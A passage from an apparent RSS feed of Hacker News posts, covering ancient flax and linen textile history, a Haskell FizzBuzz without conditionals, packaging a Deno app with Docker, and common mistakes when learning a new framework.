<p>(<strong>Bibliography Note:</strong> For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I’m going to include a short selected bibliography here up front for the whole series.  For the beginner looking to get their feet under themselves when it comes to pre-modern textile production, E.W. Barber, <em>Women’s Work: The First 20,000 Years, Women, Cloth and Society in Early Times</em> (1994) is the standard starting point.  Also note E.W. Barber, <em>Prehistoric Textiles: The Development of Cloth in the Neolithic and Bronze Ages with Special Reference to the Aegean</em> (1991).  More specific to the Romans, M. Gleba, <em>Textile Production in Pre-Roman Italy</em> (2008) is an indispensable book which gathers together a lot of the quite technical investigation – often done by archaeologists rather than historians because the literary record on textile production can be quite disappointing – in a fairly easy to read location.  Several of the essays in M. Gleba and J. Pásztókai-Szeöke <em>Making Textiles in Pre-Roman Times and Roman Times: People, Places, Identities</em> (2013), while more technical in nature, were also useful here, especially on the question of who did this sort of thing.  Also on this point, L. L. Lovén, <em>The Imagery of Textile Making: Gender and Status in the Funerary Iconography of Textile Manufacture in Roman Italy and Gaul</em> (2002).  On textile production for soldiers, note in the Greek context G.S. Aldrete, S. Bartel and A. Aldrete, <em>Reconstructing Ancient Linen Body Armor: Unraveling the Linothorax Mystery</em>(2013) which also has some very useful time-labor study data; for Roman soldiers note the essays in M.L. Nosch ed., <em>Wearing the Cloak: Dressing the Soldier in Roman Times</em> (2012) and G. Sumner, <em>Roman Military Dress </em>(2009).  On the cloth trade in medieval Europe, I’ve relied heavily on J.S. Lee, <em>The Medieval Clothier</em> (2018).</p>



<p>If it sounds like pre-modern textile production is one of those fields that is only now, somewhat belatedly receiving the attention it has long deserved, that is by and large correct!  As you can see, compared to the discussion of farming or iron-working, the key references here are often decades younger (one is left to assume that it is something to do with the fact that this work was largely done by women that led to it being so late to receive its due study).  Fortunately, archaeology is giving us a lot of the evidence that our literary sources don’t, especially for the ancient world, which has enabled a lot of this work.  May it continue!)</p>



<h2>Meet the Fibers! Flax and Linen</h2>



<p>Linen fabrics are produced from the fibers of the flax plant, <em>Linum usitatissimum</em>.  This common flax plant is the domesticated version of the wild <em>Linum bienne</em>, domesticated in the northern part of the fertile crescent no later than 7,000 BC, although wild flax fibers were being used to produce textiles even earlier than that. Consequently the use of linen fibers goes <em><strong>way </strong></em>back. In fact, the oldest known textiles are made from flax, including finds of fibers at Nahal Hemar (7th millennium BC), Çayönü (c. 7000 BC), and Çatalhöyük (c. 6000 BC). Evidence for the cultivation of flax goes back even further, with linseed from Tell Asward in Syria dating to the 8th millennium BC. Flax was being cultivated in Central Europe no later than the second half of the 7th millennium BC.</p>



<figure><img data-attachment-id="6451" data-permalink="https://acoup.blog/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088/" data-orig-file="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg" data-orig-size="439,591" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=223" data-large-file="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=439" src="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=439" alt="" srcset="https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg 439w, https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=111 111w, https://acoupdotblog.files.wordpress.com/2021/03/linum_usitatissimum_-_kohlere28093s_medizinal-pflanzen-088.jpg?w=223 223w" sizes="(max-width: 439px) 100vw, 439px"><figcaption><a href="https://en.wikipedia.org/wiki/Flax">Via Wikipedia</a>, the flax plant, showing the seeds and – more importantly for our purpose – the stalk which, when fully grown contains the bast fibers used to make linen.</figcaption></figure>



<p>Flax is a productive little plant that produces two main …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/">https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355046</guid>
            <pubDate>Fri, 05 Mar 2021 10:02:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fizzbuzz Without If Clauses]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26353967">thread link</a>) | @beny23
<br/>
March 4, 2021 | https://beny23.github.io/posts/fizzbuzz_without_ifs/ | <a href="https://web.archive.org/web/*/https://beny23.github.io/posts/fizzbuzz_without_ifs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://beny23.github.io/images/fizzbuzz_without_ifs_title.png" alt=""></p><p>In this writing I aim to complete a Fizzbuzz without if statements, conditionals, pattern matching
or even using modulus calculations. And if that isn’t enough I thought I’d use the opportunity
to explore <a href="https://www.haskell.org/">Haskell</a>.</p><p>The idea originated in the Friday lunchtime “Curry Club” at HMRC Digital where a few like-minded software engineers
are getting together to teach themselves Haskell. (For those not in on the joke, the language is named
after the logician Haskell Curry). At one of those sessions, talking about ifs and conditionals the
challenge was posited that a Fizzbuzz can be done without ifs.</p><p>A Fizzbuzz test is a fairly common programming challenge, often used to evaluate a developer’s
skill level. The basic instructions are as follows</p><blockquote><p>Write a class that produces the following for any contiguous range of integers:</p><p>the number</p><ul><li>‘fizz’ for numbers that are multiples of 3</li><li>‘buzz’ for numbers that are multiples of 5</li><li>‘fizzbuzz’ for numbers that are multiples of 15</li></ul><p>e.g. Running the program with a range from 1-20 should produce the following result:</p><p><code>1 2 fizz 4 buzz fizz 7 8 fizz buzz 11 fizz 13 14 fizzbuzz 16 17 fizz 19 buzz</code></p></blockquote><p>Now, I’ve marked a fair number of fizzbuzz challenges in my time and the most important piece of
advice is: Keep it simple!</p><p>Under normal condition, the following pseudo code lends itself to the better solutions:</p><pre><code>if (number is multiple of 15) print "fizzbuzz"
else if (number is multiple of 5) print "fizz"
else if (number is multiple of 3) print "buzz"
else print number
</code></pre><p>It does not try to be clever (many candidates fall down because they want to show off the latest
shiny technique, but technical interviewers wouldn’t be looking to that) and does the job. Simple!</p><p>So how could this be achieved without if clauses or using modulo calculations? I would class
pattern matching as cheating here, so the following scala snippet would also be disqualified:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td><td><pre><code data-lang="scala">scala<span>&gt;</span> <span>(</span><span>1</span> to <span>20</span><span>).</span>map <span>{</span>
     <span>|</span> <span>case</span> n <span>if</span> n <span>%</span> <span>15</span> <span>==</span> <span>0</span> <span>=&gt;</span> <span>"fizzbuzz"</span>
     <span>|</span> <span>case</span> n <span>if</span> n <span>%</span> <span>5</span> <span>==</span> <span>0</span> <span>=&gt;</span> <span>"buzz"</span>
     <span>|</span> <span>case</span> n <span>if</span> n <span>%</span> <span>3</span> <span>==</span> <span>0</span> <span>=&gt;</span> <span>"fizz"</span>
     <span>|</span> <span>case</span> n <span>=&gt;</span> n<span>.</span>toString
     <span>|</span> <span>}</span>
res0 <span>=</span> <span>Vector</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> fizz<span>,</span> <span>4</span><span>,</span> buzz<span>,</span> fizz<span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> fizz<span>,</span> buzz<span>,</span> <span>11</span><span>,</span> fizz<span>,</span> <span>13</span><span>,</span> <span>14</span><span>,</span> fizzbuzz<span>,</span> <span>16</span><span>,</span> <span>17</span><span>,</span> fizz<span>,</span> <span>19</span><span>,</span> buzz<span>)</span>
scala<span>&gt;</span>
</code></pre></td></tr></tbody></table></div></div><p>I’ll just go ahead and show what I ended up coming up with:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> replace n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>Prelude</span><span>&gt;</span> replace <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span> <span>$</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"fizz"</span>,<span>"4"</span>,<span>"buzz"</span>,<span>"fizz"</span>,<span>"7"</span>,<span>"8"</span>,<span>"fizz"</span>,<span>"buzz"</span>,<span>"11"</span>,<span>"fizz"</span>,<span>"13"</span>,<span>"14"</span>,<span>"fizzbuzz"</span>,<span>"16"</span>,<span>"17"</span>,<span>"fizz"</span>,<span>"19"</span>,<span>"buzz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>Now I will break it down. The intuition was that I would be able to use a method loosely (very loosely)
inspired by the Sieve of Eratosthenes, whereby I would create lists of functions that would replace
every 3rd element by “fizz”, every 5th element by “buzz” and every 15th element by “fizzbuzz”.</p><p>So essentially what I was after are lists like so</p><pre><code>["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", ...]
["", "", "fizz", "", "", "fizz", "", "", "fizz", "", "", "fizz", "", "", "fizz", ...]
["", "", "",     "", "buzz", "", "", "", "",     "buzz", "", "", "", "", "buzz", ...]
["", "", "",     "", "",     "", "", "", "",     "",     "", "", "", "", "fizzbuzz", ...]
</code></pre><p>where any non-empty values replace the values in the previous list. To do so, I use a mixture
of <code>replicate</code> and <code>cycle</code>.</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell">(replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v]
</code></pre></td></tr></tbody></table></div></div><p>This creates a list where the <code>id</code> function repeated <code>n-1</code> times followed by a lambda that ignores the
input and just replaces it with a value. So if a call this with <code>n=3</code> and <code>v="fizz"</code>, what I get is:</p><pre><code>[id, id, \x -&gt; v]
</code></pre><p>Then I use the <code>cycle</code> function to create an infinite repeating list. This makes use of the fact that
Haskell is lazily evaluated, meaning that I list can be defined as infinite but its constituent elements
are not created until they’re used, so:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span></code></pre></td><td><pre><code data-lang="haskell"><span>cycle</span> [id, id, <span>\</span>x <span>-&gt;</span> v] <span>=</span> 
  [id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, <span>...</span>]
</code></pre></td></tr></tbody></table></div></div><p>This gives me my <code>replace</code> function:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell"><span>replace</span> n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
</code></pre></td></tr></tbody></table></div></div><p>whereby <code>zipWith ($) listOfFunctions values</code> creates a new list that applies the first function to
the first value, second function to the second value, etc, so, if call this with <code>n=6</code> and <code>v="fizz"</code>
and <code>xs=[1..6]</code>, the following substitutions can be made:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td><td><pre><code data-lang="haskell"><span>zipWith</span> (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>zipWith</span> (<span>$</span>) (cycle ((replicate <span>2</span> (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> <span>"fizz"</span>])) [<span>"1"</span><span>..</span><span>"6"</span>]
<span>zipWith</span> (<span>$</span>) (cycle [id, id, <span>\</span>x <span>-&gt;</span> v]) [<span>"1"</span><span>..</span><span>"6"</span>]
<span>zipWith</span> (<span>$</span>) [id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v] [<span>"1"</span><span>..</span><span>"6"</span>]
[id <span>$</span> <span>"1"</span>, id <span>$</span> <span>"2"</span>, <span>"3"</span> <span>-&gt;</span> <span>"fizz"</span>, id <span>$</span> <span>"4"</span>, id <span>$</span> <span>"5"</span>, <span>"6"</span> <span>-&gt;</span> <span>"fizz"</span>]
[<span>"1"</span>, <span>"2"</span>, <span>"fizz"</span>, <span>"4"</span>, <span>"5"</span>, <span>"fizz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>So to put it all together, we then want to replace all the “fizz”, “buzz” and “fizzbuzz” entries in
our list, to do that I think the dot operator in Haskell makes for nice reading:</p><p>so the snippet</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell"><span>replace</span> <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span>
</code></pre></td></tr></tbody></table></div></div><p>just creates a single function that first replaces all the “fizz”, then “buzz”, then “fizzbuzz”</p><p>Finally, we’ve got our list of numbers. But in this case we don’t actually want a list of numbers,
as our <code>replace</code> function is expecting strings, so the following creates our list of string
by using the <code>show</code> function</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"3"</span>,<span>"4"</span>,<span>"5"</span>,<span>"6"</span>,<span>"7"</span>,<span>"8"</span>,<span>"9"</span>,<span>"10"</span>,<span>"11"</span>,<span>"12"</span>,<span>"13"</span>,<span>"14"</span>,<span>"15"</span>,<span>"16"</span>,<span>"17"</span>,<span>"18"</span>,<span>"19"</span>,<span>"20"</span>]
</code></pre></td></tr></tbody></table></div></div><p>We just combine the function with our list and there’s the Fizzbuzz answer:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> replace n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>Prelude</span><span>&gt;</span> replace <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span> <span>$</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"fizz"</span>,<span>"4"</span>,<span>"buzz"</span>,<span>"fizz"</span>,<span>"7"</span>,<span>"8"</span>,<span>"fizz"</span>,<span>"buzz"</span>,<span>"11"</span>,<span>"fizz"</span>,<span>"13"</span>,<span>"14"</span>,<span>"fizzbuzz"</span>,<span>"16"</span>,<span>"17"</span>,<span>"fizz"</span>,<span>"19"</span>,<span>"buzz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>In summary, I’ve tried to get an alternative view on how a Fizzbuzz can be implemented, without
using the traditional tools. Now, if I’m honest, if I were to mark such a submission, I would be disappointed
that it doesn’t allow me to use arbitrary ranges. My solution above would not provide the correct answer
for a range that doesn’t start with 1.</p><p>This was a fun exercise and hope will give you some food for thought.</p><p><a href="https://news.ycombinator.com/item?id=26353967">Discuss on Hackernews</a></p><ul></ul></div></div>]]>
            </description>
            <link>https://beny23.github.io/posts/fizzbuzz_without_ifs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26353967</guid>
            <pubDate>Fri, 05 Mar 2021 07:42:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Packaging a Deno App with Docker]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26353659">thread link</a>) | @craig
<br/>
March 4, 2021 | https://hobochild.com/posts/deno-demo.html | <a href="https://web.archive.org/web/*/https://hobochild.com/posts/deno-demo.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><a href="https://hobochild.com/"><svg id="i-arrow-left" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 28" width="32" height="14" zindex="1" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
        <path d="M10 6 L2 16 10 26 M2 16 L30 16"></path>
    </svg>Home</a><p>I’ve been following <a href="https://deno.land/">deno</a> from a far for a while now, I’m particularly interested in it for two reasons.</p><ol><li>First class typescript support - I hate having to compile things with babel or webpack and then having to run them via node in production it always ends-up being a little brittle &amp; complicated with everyone having their own home grown scripts and workflows for dev and production.</li><li>Compiled executables - Scripting languages are really neat for making little tools, but they are pretty hard to distribute. For that reason I’ve been using Go for <a href="https://hobochild.com/#tools">small utilities</a>, but I’d much prefer to write these tools in something like python or javascript.</li></ol><p>So I thought I’d dip my toes in and see how a packaged app would look. Deno has fairly unique dependency story compared to javascript’s npm ecosystem. It pulls dependencies from remote urls on first run and then caches them until you clear the cache, very similar to how a browser loads a webpages dependencies.</p><blockquote><p>If you want to skip the rest and just check out the code it can be found 👉 <a href="https://github.com/hobochild/deno-demo">here</a></p></blockquote><p>The first thing to figure out was how to create a reproducible build, turned out to be fairly easy you can create a lock file with:</p><pre><code><pre>deno cache --lock<span>=</span>lock.json --lock-write src/deps.ts
</pre></code></pre><p>And then install with that lock file using:</p><pre><code><pre>deno cache --reload --lock<span>=</span>lock.json src/deps.ts
</pre></code></pre><p>The next was how to make that build as small as possible, I did this by using deno’s compile feature which can cross-compile standalone binaries (quite similar to vercel’s <a href="https://www.npmjs.com/package/pkg">pkg</a>). The linux executable is dynamically linked with <code>glibc</code> so you’ll that present, luckily most systems have this. I unfortunately encountered the issue because I tried to use the vanilla apline image.</p><p>The results:</p><p><a href="https://github.com/hobochild/deno-demo">The code</a> is fairly self explanatory. It’s a <a href="https://github.com/hobochild/deno-demo/Dockerfile">multi-stage docker build</a> for a bare-bones <code>oak</code> server (comparable to node.js’s express). There are 3 useful make targets.</p><ol><li><code>make size_uncompressed</code> - this will give you the <a href="https://hobochild.com/posts/ondisk">ondisk</a> size of the image.</li></ol><p>The on disk size comes out a 53.3mb (30mb of this is your executable) the rest is the apline image. (Node apline image is 116MB)</p><ol><li><code>make size_compressed</code> - This will give you the gzipped image size which should be comparable to what you’d pull from a registry.</li></ol><p>The compressed size comes in at 21mb, the node.js apline image by comparison is 38.93 MB</p><ol><li><code>make run</code> - run the server.</li></ol><p>My little experience with deno has been very positive so far. I really like how it’s cleaning up typescript &amp; javascript’s disparate ecosystem and creating a uniform toolkit for building software.</p><p>Next I’m looking forward to try out their built in test framework too see how that fairs against more established things like jest.</p></div></div>]]>
            </description>
            <link>https://hobochild.com/posts/deno-demo.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26353659</guid>
            <pubDate>Fri, 05 Mar 2021 06:50:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mistakes to Avoid When Learning a New Framework or Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26353601">thread link</a>) | @eisabai
<br/>
March 4, 2021 | https://betterprogramming.pub/5-mistakes-to-avoid-when-learning-a-new-framework-or-programming-language-a8ba9c3f1160 | <a href="https://web.archive.org/web/*/https://betterprogramming.pub/5-mistakes-to-avoid-when-learning-a-new-framework-or-programming-language-a8ba9c3f1160">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><h2 id="dece">Be vigilant by understanding pivotal learning mistakes</h2><div><div><div><div><a href="https://eisabai.medium.com/?source=post_page-----a8ba9c3f1160--------------------------------" rel="noopener"><div><p><img alt="Isabel Nyo" src="https://miro.medium.com/fit/c/96/96/1*BGXgVWhH-nqrX6VruxEvmA.jpeg" width="48" height="48"></p></div></a></div></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of half an archway close to housing" src="https://miro.medium.com/max/8292/0*el9ezXeq8AVyn7L2" width="4146" height="3006" srcset="https://miro.medium.com/max/552/0*el9ezXeq8AVyn7L2 276w, https://miro.medium.com/max/1104/0*el9ezXeq8AVyn7L2 552w, https://miro.medium.com/max/1280/0*el9ezXeq8AVyn7L2 640w, https://miro.medium.com/max/1400/0*el9ezXeq8AVyn7L2 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*el9ezXeq8AVyn7L2?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@gruu?utm_source=medium&amp;utm_medium=referral" rel="noopener">Anna Gru</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="a44e">Learning, upskilling, and staying in touch with the latest technology and trends are a part of any software developer’s life. They are not optional extras but are vital to the successful achievement of their career goals. However, there are some common learning mistakes that developers often make regardless of where they are currently in their careers.</p><p id="ed23">The common learning mistakes are:</p><ol><li id="bcd6">Not having a learning plan.</li><li id="cb91">Not setting a clear end goal.</li><li id="fd0d">Choosing too broad a topic.</li><li id="406e">Having a consumption overload.</li><li id="ffb4">Not keeping track of progress.</li></ol></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of person on laptop" src="https://miro.medium.com/max/11520/0*ZdqNg4jjyniaoCe2" width="5760" height="3840" srcset="https://miro.medium.com/max/552/0*ZdqNg4jjyniaoCe2 276w, https://miro.medium.com/max/1104/0*ZdqNg4jjyniaoCe2 552w, https://miro.medium.com/max/1280/0*ZdqNg4jjyniaoCe2 640w, https://miro.medium.com/max/1400/0*ZdqNg4jjyniaoCe2 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ZdqNg4jjyniaoCe2?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@chuklanov?utm_source=medium&amp;utm_medium=referral" rel="noopener">Avel Chuklanov</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="7042">There is a saying that if you fail to plan, you plan to fail, and this applies to learning too. Sometimes, developers get impatient and plunge straight into active learning without any preparation. For example, a developer might say they want to learn a JavaScript framework, React. They may start reading tutorials about React without any outline on what areas they want to focus on, or how to get to their end goal: being able to write React applications.</p><p id="6916">The better way of learning, in this case, will be looking at the official documentation, going through the step-by-step approach from main concepts to advanced guides and API references, and creating a sample application in React. After this, looking at and learning from other examples out there and setting SMART goals for each stage of their learning will be helpful. S.M.A.R.T. goals are good goals because they’re specific, measurable, achievable, realistic, and time-bound.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a bullseye" src="https://miro.medium.com/max/10336/0*ycA_TuwSGX-DwcOr" width="5168" height="3448" srcset="https://miro.medium.com/max/552/0*ycA_TuwSGX-DwcOr 276w, https://miro.medium.com/max/1104/0*ycA_TuwSGX-DwcOr 552w, https://miro.medium.com/max/1280/0*ycA_TuwSGX-DwcOr 640w, https://miro.medium.com/max/1400/0*ycA_TuwSGX-DwcOr 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ycA_TuwSGX-DwcOr?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@enginakyurt?utm_source=medium&amp;utm_medium=referral" rel="noopener">engin akyurt</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1985">There are so many new technologies and new ways of doing things in the <a href="https://hackernoon.com/tagged/software-development" rel="noopener">software development</a> industry. Don’t get me wrong; I believe continuous learning is a good thing. You can only grow your skill set and knowledge if you are open to learning. However, if a developer has too much FOMO (Fear of Missing Out) about learning every new thing that they hear about — then there will be no time left for being productive or putting her knowledge and skills to good use.</p><p id="bcfd">Before you learn something, I’d encourage you to think about why you’re learning it — and where and how you’ll use your newly learned knowledge or skill. For example, if you’re a backend developer, and you’re learning JavaScript, you’re doing so because your goal is to move to full-stack development. Or, if you’re a DevOps and learning AWS, you might be doing so to increase your chance of a new employment opportunity at a company that uses AWS.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of the sea and sky." src="https://miro.medium.com/max/12408/0*bfFnMGfMLjIakmKq" width="6204" height="4136" srcset="https://miro.medium.com/max/552/0*bfFnMGfMLjIakmKq 276w, https://miro.medium.com/max/1104/0*bfFnMGfMLjIakmKq 552w, https://miro.medium.com/max/1280/0*bfFnMGfMLjIakmKq 640w, https://miro.medium.com/max/1400/0*bfFnMGfMLjIakmKq 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bfFnMGfMLjIakmKq?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mattmaber?utm_source=medium&amp;utm_medium=referral" rel="noopener">Matthew Maber</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="aa08">Ever heard of the saying — everything but the kitchen sink? Sometimes, developers get too greedy with wanting to know everything about a topic that they fail to narrow down and, instead, set a very broad learning objective. How broad is too broad, I hear you ask. In my opinion, a topic is too broad if you can’t articulate your learning outcomes in a few words to another developer.</p><p id="6bd4">Learning outcomes are statements about knowledge or skill a developer should acquire by the end of their learning journey on a specific topic. Sure, you can learn about a particular topic forever, but there must be a point when you decide for yourself that it is enough, for now. Enough for you to feel confident in working toward and achieving your end goal.</p><p id="dc7e">For example, here are some learning outcomes for learning React Javascript framework.</p><p id="b7ae">By the end of my learning program, I should be able to create a new React app from scratch that can:</p><ul><li id="db4c">Consume JSON payload in a REST API</li><li id="54a3">Refresh the content of the app every <code>x</code> mins</li><li id="d377">Navigate to different screens</li><li id="2fa8">Remember the last screen I visited before (if any)</li><li id="24ff">Be Unit-tested</li></ul><p id="6ee5">Note that the above learning outcomes are not too specific or detailed (like creating a component in JSX syntax, for example) because you don’t know about the ins and outs of the React framework yet. They are not too broad either; there is a clear outcome for each statement instead of just a broad, generic one, like “Create a React app.”</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of multiple waterfalls" src="https://miro.medium.com/max/9216/0*YWDZfhREIQqoJ_fy" width="4608" height="3008" srcset="https://miro.medium.com/max/552/0*YWDZfhREIQqoJ_fy 276w, https://miro.medium.com/max/1104/0*YWDZfhREIQqoJ_fy 552w, https://miro.medium.com/max/1280/0*YWDZfhREIQqoJ_fy 640w, https://miro.medium.com/max/1400/0*YWDZfhREIQqoJ_fy 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*YWDZfhREIQqoJ_fy?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mikeanywhere?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike Lewis HeadSmart Media</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="c174">Tutorial fatigue — it’s real. If you think you’re learning something by going through endless books, videos, and tutorials then you’re simply wasting your time. Pick a few options, be it books, videos, or any other format, and stick with them. Chances are what you learn in a video will be very similar to another tutorial that you’re reading on the same topic.</p><p id="7c5d">To give you another example, I did a quick search on Amazon about React Javascript framework, and there were about 700 books on the topic — a few of them even have the exact same book title, <em>Learning React</em>. There is no way you can get through all the books, and even if you did, it is no guarantee that you’ll become an expert at React, or is it a good use of your time.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a loading screen" src="https://miro.medium.com/max/12096/0*5fuYpC-mFVleIePR" width="6048" height="4024" srcset="https://miro.medium.com/max/552/0*5fuYpC-mFVleIePR 276w, https://miro.medium.com/max/1104/0*5fuYpC-mFVleIePR 552w, https://miro.medium.com/max/1280/0*5fuYpC-mFVleIePR 640w, https://miro.medium.com/max/1400/0*5fuYpC-mFVleIePR 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*5fuYpC-mFVleIePR?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mike_van_den_bos?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike van den Bos</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="a189">Having a clear plan and a definite goal is good, but they serve little purpose if you’re not keeping track of how you’re progressing — and if you’re reaching your goals. Review your progress every fortnight, or at least every month, and ask yourself whether you are heading in the right direction.</p><p id="568e">I recommend setting up a reminder in your calendar to review your progress at a regular interval at the start of your learning journey — so you don’t forget about it. If you’re not achieving your goals timely, it’s a chance for you to understand where you may be struggling with and revise your plan. On the other hand, if you’re achieving your goals, celebrate them to keep your momentum and motivation going.</p></div></div></section><section><div><div><figure><div role="button" 